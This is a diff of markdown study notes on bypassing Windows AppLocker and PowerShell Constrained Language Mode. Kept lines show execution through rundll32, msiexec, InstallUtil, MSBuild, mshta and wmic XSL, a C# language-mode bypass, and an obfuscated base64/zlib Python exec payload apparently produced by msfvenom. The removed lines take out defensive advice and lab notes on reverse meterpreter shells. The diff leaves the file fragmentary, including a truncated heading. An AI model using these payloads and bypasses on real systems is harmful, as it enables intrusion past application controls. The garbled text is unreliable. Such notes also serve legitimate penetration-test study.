@@ -66,14 +66,7 @@ extern "C" __declspec(dllexport) void run()
 	MessageBoxA(NULL, "Execution happened", "Bypass", MB_OK);
 }
 ```
-- compile and use `rundll32` tool to execute `rundll32 <path to dll>\name.dll,run`
-- GPO Advanced rule to enable DLL enforcement
 
-##### Extra Mile:
-- Code signing bypass example: https://forensicitguy.github.io/making-meterpreter-look-google-signed/
-- other ways to embed a non-java payload with a signed msi?
-
-Bypassing AppLocker using installer packages is a well-known technique that leverages the trust that AppLocker places in certain signed executables, such as `msiexec.exe` or other installer-related binaries. Here's how this can be done:
 
 ### **Understanding AppLocker**
 
@@ -119,21 +112,6 @@ One of the common methods to bypass AppLocker involves using the Windows Install
 2. **Run the Modified MSI:**
    - Similar to the above methods, execute the MSI using `msiexec.exe` to trigger the custom action and run your payload.
 
-### **Defensive Considerations**
-
-To protect against such bypass techniques:
-- **Whitelist by File Hash:** Whitelisting by file hash rather than by path or publisher can prevent trusted binaries from being abused.
-- **Audit AppLocker Logs:** Regularly audit AppLocker logs to detect unusual use of installer packages.
-- **Restrict Installation Privileges:** Limit the ability of users to execute `msiexec.exe` or other installer binaries unless necessary.
-- **Use Device Guard:** Implement additional security controls like Device Guard to restrict code execution more granularly.
-
-### **Conclusion**
-
-Bypassing AppLocker using installer packages is a technique that exploits the trust Windows places in certain binaries like `msiexec.exe`. While effective, this method highlights the importance of robust and carefully configured security controls to mitigate such risks.
-
-Modifying an existing MSI file to include custom actions or payloads can be done using tools like **Orca**, **InstEd**, or **WiX Toolset**. Below, I’ll guide you through the process using Orca, a tool provided by Microsoft, which allows for detailed editing of MSI files.
-
-The default Windows Installer rules in Windows are part of the AppLocker and Software Restriction Policies (SRP) that help to control which executables, scripts, and installers can run on a system. Understanding these rules and how they operate can give insight into potential bypass techniques.
 
 ### **Default Windows Installer Rules Overview**
 
@@ -217,29 +195,7 @@ Windows typically comes with default rules that allow or deny the execution of M
 **Bypass Example**:
 - A malicious script or EXE that performs the same actions as an MSI but isn’t covered by the same rules.
 
-### **Defense Against These Bypass Techniques**
 
-1. **Strict Application Control**:
-   - Ensure that rules are not overly broad and cover all potential file types and execution paths.
-
-2. **Code Signing Enforcement**:
-   - Require that all executables, including MSI files, must be signed by a trusted CA, and maintain a strict allowlist of publishers.
-
-3. **Path and File Type Restrictions**:
-   - Limit the execution of installers to specific, tightly controlled paths, and avoid allowing wildcard paths.
-
-4. **Regular Auditing**:
-   - Periodically review and audit the rules in place to ensure they cover new threats and reflect the current environment.
-
-5. **Application Whitelisting**:
-   - Implement stricter application whitelisting policies using AppLocker or other tools to control what software can run.
-
-6. **Logging and Monitoring**:
-   - Ensure that all execution attempts are logged and that unusual activity is flagged for further investigation.
-
-### **Conclusion**
-
-By understanding the default Windows Installer rules and the potential gaps in their enforcement, you can identify ways to bypass these protections during a penetration test. However, this knowledge should also be used to help secure systems by tightening policies and implementing more stringent controls. Regular audits and updates to security policies are essential to maintaining robust defenses against such attacks.
 
 ### **Step-by-Step Guide to Modify an Existing MSI File**
 
@@ -300,113 +256,7 @@ By understanding the default Windows Installer rules and the potential gaps in t
 2. **Monitor the Installation:**
    - Use tools like Process Monitor, Event Viewer, or simply watch the directories to see if your custom actions are executed correctly.
 
-### **Important Notes**
-
-- **Legal and Ethical Considerations:** Modifying MSI files, especially to inject malicious code, can have legal and ethical implications. Ensure you have proper authorization to modify the software.
-- **Digital Signatures:** Modifying an MSI file will break its digital signature. If the MSI is signed, the user may receive a warning during installation unless it’s re-signed.
-- **Testing:** Always thoroughly test modified MSI files in a controlled environment before deploying them in production.
-
-This process provides a basic overview of how to modify an existing MSI file. More complex modifications might require in-depth knowledge of the MSI format and the Windows Installer service.
-
-Windows Installer default rules, especially when enforced by tools like AppLocker or Software Restriction Policies (SRP), are designed to control which applications can run on a Windows system. Understanding these default rules is key to both securing your environment and understanding potential bypass techniques.
-
-### **Default Windows Installer Rules**
-
-Windows Installer rules in AppLocker or SRP typically permit the execution of the following:
-
-1. **Trusted Installers (`msiexec.exe`):**
-   - The `msiexec.exe` binary, which is part of the Windows Installer service, is usually allowed by default because it is a system file signed by Microsoft. This executable is responsible for installing, modifying, and removing applications that are packaged as MSI files.
-
-2. **Programs Installed in Program Files and Windows Directory:**
-   - Executables located in trusted directories like `C:\Program Files`, `C:\Program Files (x86)`, and `C:\Windows` are usually allowed to run because these directories are trusted locations.
-
-3. **Publisher Rules:**
-   - Applications signed by trusted publishers, especially Microsoft, may be allowed to run based on their digital signature.
-
-4. **Path Rules:**
-   - Certain paths may be explicitly allowed, permitting executables within these directories to run.
-
-### **Potential Bypass Techniques**
-
-Given the above default rules, several bypass techniques can be employed if the AppLocker or SRP configuration is not stringent enough:
-
-#### **1. Using `msiexec.exe` to Execute Malicious MSI Files**
-
-- **Technique:** Since `msiexec.exe` is a trusted executable, attackers can create a malicious MSI package that contains a payload. Running this package via `msiexec.exe` would execute the payload.
-  
-  ```powershell
-  msiexec /quiet /i payload.msi
-  ```
-
-- **Why It Works:** AppLocker and SRP might trust `msiexec.exe` by default and allow it to run any MSI package, even if the package itself is malicious.
-
-#### **2. Dropping Executables in Trusted Directories**
-
-- **Technique:** An attacker with write access to a trusted directory (like `C:\Program Files` or `C:\Windows\Temp`) could drop an executable there, which would then be allowed to run by default.
-  
-  - **Example:** Dropping a payload in `C:\Windows\Temp\malware.exe` and executing it.
-
-- **Why It Works:** These directories are typically allowed by default, assuming that anything within them is trusted.
-
-#### **3. DLL Hijacking**
-
-- **Technique:** AppLocker and SRP primarily focus on executable files (`.exe`), but they might not control DLLs as strictly. An attacker could replace or inject a malicious DLL into a location where a trusted executable will load it.
-
-  - **Example:** Placing a malicious `msvcrt.dll` in the same directory as a trusted application that will load it at runtime.
-
-- **Why It Works:** If the directory containing the DLL is trusted, the application will load it, potentially allowing the attacker to execute arbitrary code.
-
-#### **4. Exploiting Allowed Scripts or Macros**
-
-- **Technique:** If scripts like PowerShell or VBScript are allowed, an attacker could run malicious scripts that bypass AppLocker rules. Similarly, Office macros, if allowed, can be exploited to execute malicious code.
-
-  - **Example:** A PowerShell script that downloads and executes a payload.
-
-  ```powershell
-  powershell -ExecutionPolicy Bypass -File script.ps1
-  ```
-
-- **Why It Works:** AppLocker might allow script engines like `powershell.exe` or `cscript.exe` by default.
-
-#### **5. Utilizing Trusted Publisher Signing**
-
-- **Technique:** If AppLocker allows binaries signed by a trusted publisher, an attacker might find or create a signed binary (even if it's from a third party) that performs unintended actions.
-
-  - **Example:** Using a legitimate signed executable that can be coerced into running a malicious DLL or script.
-
-- **Why It Works:** The focus is on the publisher's signature, not on the behavior of the executable.
-
-#### **6. In-Memory Execution**
-
-- **Technique:** Some tools and scripts can execute code directly in memory without dropping an executable to disk, thereby bypassing AppLocker or SRP.
-
-  - **Example:** Tools like `PowerShell`, `Cobalt Strike`, or `Reflective DLL Injection` techniques can execute code in memory.
-
-- **Why It Works:** Since there's no physical file to check, AppLocker rules don't apply.
-
-### **Defensive Measures**
-
-To protect against these bypass techniques:
-
-1. **Enforce Strict AppLocker Rules:**
-   - Use hash or certificate rules instead of path rules where possible.
-   - Monitor and restrict the use of `msiexec.exe` and other trusted installer binaries.
-   - Implement rules that cover not only executables but also scripts, DLLs, and other potential attack vectors.
-
-2. **Limit Write Access to Trusted Directories:**
-   - Ensure that only trusted administrators have write access to directories like `C:\Windows` and `C:\Program Files`.
-
-3. **Use Windows Defender Application Control (WDAC):**
-   - WDAC provides more granular control over what can run on your systems, including DLLs and scripts, and can be a more secure alternative to AppLocker.
-
-4. **Regular Auditing:**
-   - Continuously audit the execution of installers and other high-risk binaries, looking for anomalies or signs of misuse.
-
-5. **Disable Macros and Unnecessary Scripting Languages:**
-   - If possible, disable or restrict the use of macros, PowerShell, and other scripting engines.
-
-By understanding these default rules and potential bypasses, you can better secure your environment against these attack vectors.
-
+### **I
 #### 8.2.3 Alternate Data Streams
 
 - **Alternate Data Stream (ADS)** is a binary file attribute that contains metadata
@@ -432,8 +282,6 @@ Payload size: 704 bytes
 exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNpNUW1r2zAQ/hz/Cn2zNDz5tWmaokEJabuSJaXJNmgIwrGUWVS2Up3tJh3775UTBhVCp3ueu+O5O1XtjW3Qu1bbYJuDHGYBHMHrFHOGdtKCMjVX9c54rWacq1M85/hvMvZbq11e4gfp/z+18rWV0Pj/1p1aR5tNsLOm0goatva3rdKCm72spfUD/361elze57XQzt0QrwS23nhqh/AplbEEORJ16hvDSXAZXBGCjD37aZAFKRl7g7MeBKC9ARTMWbpcziambuShwb37+LRYLSaLGXd4l6Skj6NFKYsXXhpo6ryS7DbXIE+E61jtjrwyQp6KTaZPKz5fzKfeoASa7514gVtNP4vHUQAFIZ5hjvjcJP5SgoNpLkQpc+GGydbY/wnSfr35I+vGDeGHeVda5+EFjRD+rWph3gDNVyiOaHSNHDDMrtGhf2w3jpOMRgTdOe0mTKI4cjdGt8rKnTmEJ9YnG08eZIH7jVIhC1PtrQTA5+XS7TDrQSGxob1I7JdNs4dxGMZXCY2HI5pd0Hg0GmdZGr7MHkbP6XQYVfHDVL/dzTLgzzdQTr7/kkefuGXnAhN3vA9v4LoD')[0])))
 
 ```
-- copy the payload and create a file named shell.py
-- shell.py add `import base64` along with the output of `msfvenom`
 
 ### 8.3 Bypassing Applocker with Powershell
 
@@ -564,11 +412,11 @@ namespace MaliciousCode
 }
 ```
 Compile this code into an assembly, and then run it using `InstallUtil.exe`:
-```
+```cmd
 InstallUtil.exe MaliciousCode.dll
 ```
 POC to bypass Powershell CLM:
-```
+```csharp
 using System;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
@@ -908,16 +756,6 @@ public class Run : Activity
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\bad.xml
 ```
 
-##### 8.4.4.1
-
-1. Solution was generating the xml was to create a cs program called ApplockerPowershellBypass and a Powershell script called xoml.ps1.
-	1. Uploaded ApplockerPowershellBypass to victim machine
-	2. copy ApplockerPowershellBypass to C:\\Windows\\Tasks
-	3. host xoml.ps1 on attacker web server
-	4. Run `C:\Windows\Tasks\\ApplockerPowershellBypass.exe`
-	5. xml file now generated
-2. Add variable to script and generate new xml
-
 ### JScript
 
 `mshta.exe` is a legitimate Windows utility used to execute Microsoft HTML Application (HTA) files. HTA files are essentially HTML documents that have the `.hta` file extension and can run JavaScript, VBScript, or other scripting languages in a standalone window without the restrictions typically placed on scripts running within a web browser.
@@ -981,27 +819,6 @@ mshta test.hta
 ```
 
 
-##### 8.5.1.1 Q2
-- Could not get sharpshooter to work with a payload
-- ended up crafting my own hta skeleton 
-```html
-<head>
-<script language="JScript">
-
-<!-- ADD output from DotNetToJScript here. -->
-
-</script>
-<hta:application /> 
-</head>
-<body>
-</body>
-</html>
-```
-- inserted reverse_https metepreter payload
-- C# code to inject was taken from my InjectToJscript skeleton
-```cmd
- .\DotNetToJScript\DotNetToJScript\bin\x64\Release\DotNetToJScript.exe InjectToJscriptCsWin32.dll --lang=Jscript --ver=2 -o Downloads\test.hta -c InjectToJscriptCsWin32.Class1
-```
 - Better hta skeleton
 ```html
 <html>
@@ -1105,14 +922,6 @@ wmic process call create "wmic os get /format:'file://C:/path/to/malicious.xsl'"
 By understanding how XSLT can be used to bypass AppLocker, you can better protect your systems by implementing more comprehensive security measures and monitoring.
 
 
-##### 8.5.2 
-*Note:* `wmic` needed to be executed from cmd shell and not powershell
-Used the xsl stylesheet and copied in the DotNetToJscript code to get a reverse meterpreter shell.
-
-### TODO: Use Sliver to bypass Applocker restrictions
-
-Sliver is a post-exploitation framework often used in penetration testing and Red Team engagements. Bypassing AppLocker, a Windows feature designed to restrict which applications can run on a system, typically involves finding methods to execute code in a way that circumvents these restrictions. Below are some methods you can use with Sliver to bypass AppLocker restrictions.
-
 ### **Overview of AppLocker Bypass Techniques**
 
 AppLocker rules typically allow or block applications based on:
@@ -1207,15 +1016,3 @@ Find a legitimate executable that will load your malicious DLL. Place your DLL i
 ```cmd
 legitimate_application.exe
 ```
-
-This will cause the legitimate application to load your Sliver payload via the malicious DLL.
-
-### **Considerations and Best Practices**
-
-- **Test in a Controlled Environment**: Always test your AppLocker bypass methods in a controlled environment to ensure they work as expected and to avoid unintended consequences.
-- **Avoid Detection**: Many of these techniques may trigger alarms in EDR (Endpoint Detection and Response) solutions. Using Sliver’s obfuscation features can help avoid detection.
-- **Respect Legal and Ethical Boundaries**: Ensure you have authorization to conduct such tests or engagements.
-
-### **Conclusion**
-
-Sliver offers various payload formats that can be leveraged to bypass AppLocker restrictions, whether through in-memory execution, using trusted binaries, or exploiting DLL side-loading. By carefully choosing the method and testing it, you can execute Sliver payloads on a system even with AppLocker restrictions in place.
